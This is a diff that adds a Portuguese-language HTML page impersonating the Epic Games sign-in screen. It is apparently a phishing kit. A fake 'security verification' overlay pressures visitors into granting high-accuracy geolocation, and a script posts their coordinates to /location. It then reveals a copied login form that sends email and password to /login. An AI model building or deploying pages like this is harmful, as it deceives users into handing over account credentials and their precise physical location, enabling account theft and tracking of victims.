@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar na sua Conta Epic Games</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="verify-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Games" width="50" style="margin-bottom: 15px;">
+            <h2>Verificação de Segurança</h2>
+            <p>Para proteger sua conta, confirme que você não é um robô permitindo a verificação de região.</p>
+            <button class="btn-verify" onclick="requestLocation()">VERIFICAR MINHA CONTA</button>
+        </div>
+    </div>
+
+    <div class="login-container" id="login-content">
+        <div class="logo-section">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Games">
+        </div>
+
+        <h3>Escolha como entrar na sua conta Epic</h3>
+
+        <div class="social-grid">
+            <button type="button" class="social-btn epic"><i class="fab fa-fort-awesome"></i></button>
+            <button type="button" class="social-btn google"><i class="fab fa-google"></i></button>
+            <button type="button" class="social-btn facebook"><i class="fab fa-facebook-f"></i></button>
+        </div>
+
+        <form class="login-form" action="/login" method="POST">
+            <div class="input-group">
+                <input type="email" name="email" required>
+                <label>Endereço de E-mail</label>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" name="password" required>
+                <label>Senha</label>
+            </div>
+
+            <button type="submit" class="btn-primary">ENTRAR NA CONTA AGORA</button>
+        </form>
+    </div>
+
+    <script>
+        function requestLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Envia localização para o servidor
+                    fetch('/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            acc: position.coords.accuracy
+                        })
+                    });
+
+                    // Remove o bloqueio e mostra o login
+                    document.getElementById('overlay').style.display = 'none';
+                    document.getElementById('login-content').style.display = 'block';
+
+                }, function(error) {
+                    alert("A verificação de região é obrigatória para prosseguir.");
+                    console.error("Erro de permissão: " + error.message);
+                }, { enableHighAccuracy: true });
+            } else {
+                // Caso o navegador não suporte, libera o login
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('login-content').style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
